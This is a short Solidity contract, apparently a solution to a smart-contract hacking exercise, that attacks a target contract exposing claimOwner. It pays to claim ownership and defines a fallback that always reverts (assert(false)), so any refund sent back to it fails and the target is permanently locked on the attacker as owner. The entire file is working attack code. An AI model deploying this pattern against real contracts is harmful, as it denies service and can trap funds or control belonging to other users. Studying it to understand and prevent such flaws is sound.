// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface TheOwner {
 function claimOwner() external payable;
}

contract TheOwnerAttack {
    address theOwnerAddress;

    constructor(address _theOwnerAddress) {
        theOwnerAddress = _theOwnerAddress;
    }

    // cancel the payment and drain all gas
    fallback() external payable {
        assert(false);
    }

    function attack() public payable {
        TheOwner(theOwnerAddress).claimOwner{value: msg.value}();
    }
}